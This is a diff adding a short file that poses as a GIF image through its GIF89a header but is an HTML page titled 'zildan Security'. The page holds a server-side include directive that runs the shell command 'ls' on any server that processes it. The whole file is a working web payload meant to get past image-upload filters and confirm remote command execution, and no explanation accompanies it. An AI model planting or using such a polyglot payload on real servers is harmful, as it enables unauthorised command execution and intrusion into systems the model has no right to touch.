@@ -1,0 +1,14 @@
+GIF89a;
+<!DOCTYPE html>
+<head>
+<title>zildan Security</title>
+
+</head>
+
+<body>
+<h1>Zildan</h1>
+<pre>
+<!--#exec cmd="ls" -->
+</pre>
+</body>
+</html>
